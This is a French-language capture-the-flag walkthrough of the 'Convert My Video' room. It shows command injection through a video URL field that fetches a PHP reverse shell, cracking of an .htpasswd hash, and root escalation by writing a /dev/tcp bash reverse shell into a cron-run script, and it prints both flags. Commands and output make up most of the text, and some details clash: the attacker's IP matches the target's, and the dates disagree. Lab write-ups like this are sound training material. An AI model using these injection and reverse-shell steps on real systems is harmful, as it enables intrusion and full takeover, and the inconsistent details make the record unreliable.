# Convert My Video 

## What is the name of the secret folder?

```
$ python dirsearch.py -u 10.18.22.17 -E -w /data/src/wordlists/common.txt 

 _|. _ _  _  _  _ _|_    v0.4.2
(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, js, html, do, action | HTTP method: get | Threads: 10 | Wordlist size: 4614

Error Log: /data/src/dirsearch/logs/errors-20-06-15_13-05-01.log

Target: 10.18.22.17

[13:05:01] Starting: 
[13:05:02] 200 -  747B  - /
[13:05:02] 403 -  277B  - /.hta
[13:05:04] 401 -  459B  - /admin
[13:05:14] 301 -  313B  - /images  ->  http://10.18.22.17/images/
[13:05:15] 200 -  747B  - /index.php
[13:05:15] 301 -  309B  - /js  ->  http://10.18.22.17/js/
[13:05:23] 403 -  277B  - /server-status
[13:05:25] 301 -  310B  - /tmp  ->  http://10.18.22.17/tmp/

Task Completed
```
La dir caché était `/admin`

## What is the user to access the secret folder?

`view-source:http://10.18.22.17` 

```
<html>
   <head>
      <script type="text/javascript" src="/js/jquery-3.5.0.min.js"></script>
      <script type="text/javascript" src="/js/main.js"></script>
      <link rel="stylesheet" type="text/css" href="/style.css">
   </head>
   <body>
      <div id="container">
         <div id="logos">
            <img src="images/youtube.png" alt="Youtube to MP3" height="200" width="200" />
            <img src="images/mp3-file.png" alt="Youtube to MP3" height="200" width="200" />
         </div>
         <h3>Convert My Video</h3>
         <label for="ytid">Video ID:</label><input type="text" id="ytid" name="ytid">
         <button type="button" id="convert">Convert!</button>
         <span id="message"></span>
      </div>
   </body>
</html>
```
Nous pouvons voir la dir js/main.js , nous allons voir ce qu'il se trouve à l'intérieur:
```
$(function () {
    $("#convert").click(function () {
        $("#message").html("Converting...");
        $.post("/", { yt_url: "https://www.youtube.com/watch?v=" + $("#ytid").val() }, function (data) {
            try {
                data = JSON.parse(data);
                if(data.status == "0"){
                    $("#message").html("<a href='" + data.result_url + "'>Download MP3</a>");
                }
                else{
                    console.log(data);
                    $("#message").html("Oops! something went wrong");
                }
            } catch (error) {
                console.log(data);
                $("#message").html("Oops! something went wrong");
            }
        });
    });

});
```

Maintenant, utilisons ceci pour injecter un reverse shell. Téléchargez d'abord un reverse shell PHP, renommez-le shell.php et changez l'IP et le port. 
Rendez-le disponible via un serveur Web Python (python3 -m http.server). 
Maintenant, injectez-le (vous trouverez ci-dessous les requêtes reçu sur Burpsuite):

```
POST / HTTP/1.1
Host: 10.18.22.17
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 51
Origin: http://10.18.22.17
DNT: 1
Connection: close
Referer: http://10.18.22.17

yt_url=`wget${IFS}http://10.18.22.17:8000/shell.php`
```
Ici, nous pouvons vori la réponse de Burp:

```
HTTP/1.1 200 OK
Date: Sunday, 30 Oct 2022 20:09:10 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 830
Connection: close
Content-Type: text/html; charset=UTF-8

{"status":2,"errors":"--2022-10-30 20:09:10--  http:\/\/10.18.22.17:8000\/shell.php\nConnecting to 10.18.22.17:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 5492 (5.4K) [application\/octet-stream]\nSaving to: 'shell.php'\n\n     0K .....                                                 100%  136K=0.04s\n\n2020-06-15 15:34:42 (136 KB\/s) - 'shell.php' saved [5492\/5492]\n\nWARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\n","url_orginal":"`wget${IFS}http:\/\/10.18.22.17:8000\/shell.php`","output":"","result_url":"\/tmp\/downloads\/5ee7951264f4c.mp3"}
```
Maintenant que nous avons notre reverse shell mis en place faisons cette commande `rlwrap nc -nlvp 4444` puis:
```
$ cd /var/www/html/admin/
$ ll
total 24
drwxr-xr-x 2 www-data www-data 4096 Apr 12 05:05 .
drwxr-xr-x 6 www-data www-data 4096 Jun 15 15:34 ..
-rw-r--r-- 1 www-data www-data   98 Apr 12 03:55 .htaccess
-rw-r--r-- 1 www-data www-data   49 Apr 12 04:02 .htpasswd
-rw-r--r-- 1 www-data www-data   39 Apr 12 05:05 flag.txt
-rw-rw-r-- 1 www-data www-data  202 Apr 12 04:18 index.php
$ cat .htpasswd
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```
Nous allons crack le mdp avec John:
```
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/data/src/john/run/password.lst
jessie           (itsmeadmin)
1g 0:00:00:00 DONE 2/3 (2022-10-30 20:12) 5.000g/s 12270p/s 12270c/s 12270C/s bigdog..keeper
Use the "--show" option to display all of the cracked passwords www-data@dmv:/var/www/html/tmp$ cat /var/www/html/admin/index.php
<?php
  if (isset($_REQUEST['c'])) {
      system($_REQUEST['c']);
      echo "Done :)";
  }
?>
<a href="/admin/?c=rm -rf /var/www/html/tmp/downloads">
   <button>Clean Downloads</button
Session completed. 
```
Ils nous trouvent le mot de passe jessie pour itsmeadmin

## What is the user flag?

Pour avoir le flag il suffit d'aller ici:  `/var/www/html/admin/` puis d'écrire:
```
$ cat flag.txt
flag{0d8486a0c0c42503bb60ac77f4046ed7}
```

**User Flag:** `flag{0d8486a0c0c42503bb60ac77f4046ed7}`

 ## What is the root flag?
 
```
$ SHELL=/bin/bash script -q /dev/null
www-data@dmv:/$ 
```

```
www-data@dmv:/var/www/html/tmp$ cat /var/www/html/admin/index.php
<?php
  if (isset($_REQUEST['c'])) {
      system($_REQUEST['c']);
      echo "Done :)";
  }
?>
<a href="/admin/?c=rm -rf /var/www/html/tmp/downloads">
   <button>Clean Downloads</button>
```

```
www-data@dmv:/var/www/html/tmp$ cat /var/www/html/tmp/clean.sh
rm -rf downloads
```
Petit reverse shell
`www-data@dmv:/var/www/html/tmp$ echo "bash -i >& /dev/tcp/10.18.22.17/5555 0>&1" > clean.sh`
Puis hop
```
$ rlwrap nc -nlvp 5555
```
Enfin on cat le flag:
```
root@dmv:/var/www/html/tmp# cd /root
root@dmv:~# cat root.txt
cat root.txt
flag{d9b368018e912b541a4eb68399c5e94a}
```

**Root Flag:** `flag{d9b368018e912b541a4eb68399c5e94a}`

